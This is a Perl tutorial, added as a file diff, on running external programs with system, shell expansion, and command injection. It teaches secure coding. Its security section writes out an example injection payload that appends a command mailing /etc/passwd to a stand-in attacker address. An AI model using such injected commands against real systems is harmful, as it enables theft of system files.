@@ -1,0 +1,162 @@
+=title Running external programs from Perl with system
+=timestamp 2013-06-03T22:22:22
+=indexes system
+=status show
+=books beginner_book
+=author szabgab
+=archive 1
+=comments 1
+=social 1
+
+=abstract start
+
+In many cases Perl is used as a wrapper around other programs.
+This means that we run those other programs from our Perl program.
+
+For example we use Perl to collect the parameters needed by that program
+to make it easier for us to create the correct command line to run the
+other program.
+
+In other cases we might want to capture the output of another command line
+program and then make some decisions based on that output.
+
+Perl provides us with many different solutions. We'll see some of them here.
+
+=abstract end
+
+<h2>system</h2>
+
+Probably the most simple one is called <hl>system</hl>. In its most basic
+form in accepts a string that contains exactly what you would write on
+the command line in order to invoke the external command.
+
+For example on Unix/Linux machines there is a command called "adduser",
+that can create a user account.
+You could invoke it like this:
+
+<hl>/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo</hl>
+
+So if I'd like to run this from a perl script I can write the following:
+
+<code lang="perl">
+  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
+</code>
+
+This will run the adduser command. Any output or error the
+adduser generates will end up on your screen.
+
+You can also build up the command you'd like to execute.
+The following two examples give you the same results.
+
+<code lang="perl">
+  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
+  system($cmd);
+</code>
+
+<code lang="perl">
+  my $cmd = '/usr/sbin/adduser';
+  $cmd .= ' --home /opt/bfoo';
+  $cmd .= ' --gecos "Foo Bar" bfoo';
+  system($cmd);
+</code>
+
+<h2>system with multiple arguments</h2>
+
+The <hl>system</hl> function can receive more than one arguments.
+The above example could have been written like this:
+<code lang="perl">
+  my @cmd = ('/usr/sbin/adduser');
+  push @cmd, '--home';
+  push @cmd, '/opt/bfoo';
+  push @cmd, '--gecos',
+  push @cmd, 'Foo Bar',
+  push @cmd, 'bfoo';
+  system(@cmd);
+</code>
+
+In this case all the above solutions provide the same result, but it
+is not always the case.
+
+<h2>Shell expansion</h2>
+
+Let's say you have a program called <b>checkfiles</b> that can check the files
+listed on its command line. You could call it <b>checkfiles data1.txt data2.txt</b>
+or <b>checkfiles data*.txt</b> to check all the files that has a name staring 
+with the 4 letters 'data', followed by some other characters and
+having the 'txt' extension.
+This second way of running the program would work on Unix/Linux systems where
+the shell expands the 'data*.txt' to all the files that match the description.
+When the program <b>checkfiles</b> is executed it already sees the list of files:
+<b>checkfiles data1.txt data2.txt data42.txt database.txt</b>.
+Not so of Windows, where the command line does not do this expansion.
+On Windows the program will get 'data*.txt' as input.
+
+What has it to do with your Perl script? You ask.
+
+On Windows it won't matter.
+On Unix/Linux however, if you run the 'checkfiles' program from within a Perl script
+as one string: <hl>system("checkfiles data*.txt")</hl>, then Perl will pass
+that string to the shell. The shell will do its expansion and the 'checkfiles' program
+will see the list of file. On the other hand, if you pass the command and parameters
+as separate strings: <hl>system("checkfiles", "data*.txt")</hl> then perl will run the
+'checkfiles' program directly and pass the single parameter 'data*.txt' to it without
+any expansion.
+
+As you can see, passing the whole command as a single string has its advantages.
+
+This advantage comes with a price though.
+
+<h2>The security risk</h2>
+
+Calling system with a single parameter and passing the whole command that way,
+can be a security hazard if the input can come from untrusted sources. For example
+directly from a web form. Or from the log file created by a web server.
+
+Let's say you accept the parameter of checkfiles from an untrusted source:
+
+<code lang="perl">
+  my $param = get_from_a_web_form();
+  my $cmd = "checkfiles $param";
+  system($cmd);
+</code>
+
+If the user types in 'data*.txt' then you are ok. The <hl>$cmd</hl> will contain
+<hl>checkfile data*.txt</hl>.
+
+On the other hand if the user passes in some other, more 'clever' parameters then you might
+be in trouble. For example if the user types in
+<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>.
+Then the command perl executes will look like this:
+<hl>checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd</hl>.
+
+The shell will first execute the 'checkfile data*.txt' command as you intended, but then
+it will go on, and also execute the 'mail...' command.
+That will send your password file to my darker side.
+
+If your Perl script was using <hl>system</hl> with multiple parameters, this security
+risk is avoided. If this is the Perl code:
+
+<code lang="perl">
+  my $param = get_from_a_web_form();
+  my @cmd = ("checkfiles", $param);
+  system(@cmd);
+</code>
+
+And the user types in <hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>.
+the Perl script will run the 'checkfiles' program and pass a single argument to it:
+<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>. No shell expansion
+but we also avoided the dangers of the shell.
+The 'checkfiles' program will probably complain that it cannot find a file called
+<hl>data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd</hl>, but at least our passwords
+will be safe.
+
+<h2>Conclusion and further reading</h2>
+
+It is more convenient to make one string out of the command and pass that to <hl>system</hl>,
+but if the input comes from an untrusted source, this can easily become an attack vector.
+The risk can be reduced by first checking the input against a <b>white list</b> of acceptable
+input characters. You can force yourself to think about these issues by enabling the
+<b>taint mode</b> using the <hl>-T</hl> flag on the sh-bang line.
+
+You can read more in the <a href="/perldoc/system">documentation of system</a>.
+
